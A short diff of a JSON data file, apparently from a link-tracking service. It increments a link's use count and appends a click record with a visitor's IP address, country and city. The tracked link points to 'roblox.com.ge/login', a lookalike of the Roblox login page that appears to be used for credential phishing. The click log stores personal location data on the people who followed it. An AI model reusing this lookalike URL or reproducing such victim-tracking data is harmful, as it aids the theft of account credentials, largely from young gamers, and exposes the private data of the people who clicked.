@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 865,
+    "useCount": 866,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7032,6 +7032,14 @@
         "city": "Teluk Kuantan",
         "flag": "🇮🇩",
         "countryCode": "ID"
+      },
+      {
+        "timestamp": 1777187968842,
+        "ip": "115.186.234.9",
+        "country": "Australia",
+        "city": "Brisbane",
+        "flag": "🇦🇺",
+        "countryCode": "AU"
       }
     ]
   },
